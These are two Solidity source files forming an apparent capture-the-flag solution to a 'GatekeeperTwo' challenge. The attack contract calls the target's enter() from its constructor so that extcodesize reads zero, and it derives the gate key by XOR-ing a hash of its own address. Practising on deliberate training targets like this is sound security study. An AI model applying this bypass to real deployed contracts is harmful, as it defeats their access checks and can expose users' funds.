// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { IGatekeeperTwo } from "./IGatekeeperTwo.sol";

contract GatekeeperTwoAttack {

    // in order to pass Gate 2, we need to execute the hack 
    // in the constructor so that extcodesize(caller()) will be zero.
    constructor(address gatekeeperTwoInstance) {
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(this))) ^ bytes8(type(uint64).max);
        IGatekeeperTwo(gatekeeperTwoInstance).enter(gateKey);
    }
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}